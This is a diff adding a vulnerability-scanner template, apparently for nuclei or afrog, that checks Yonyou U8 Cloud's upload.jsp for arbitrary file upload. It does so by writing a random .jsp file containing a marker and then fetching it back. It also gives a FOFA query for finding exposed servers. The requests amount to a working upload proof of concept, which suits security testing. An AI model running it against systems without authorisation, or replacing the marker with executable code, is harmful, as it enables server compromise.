@@ -1,0 +1,40 @@
+id: yonyou-u8-cloud-fileupload
+
+info:
+  name: 用友 U8 Cloud upload.jsp 任意文件上传
+  author: zan8in
+  severity: critical
+  description: |
+    用友 U8 Cloud /linux/pages/upload.jsp 存在任意文件上传。官方 afrog 校验上传内容回显，PeiQi 与 GobyVuls 文件名对照同一接口。
+  reference:
+    - https://github.com/zan8in/afrog
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: body="开启U8 cloud云端之旅"
+  tags: yonyou,u8-cloud,fileupload,intrusive
+
+variables:
+  filename: "{{rand_base(6)}}"
+  marker: "{{rand_base(16)}}"
+
+http:
+  - raw:
+      - |
+        POST /linux/pages/upload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        filename: {{filename}}.jsp
+
+        {{marker}}
+      - |
+        GET /linux/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2, '{{marker}}')"
+        condition: and
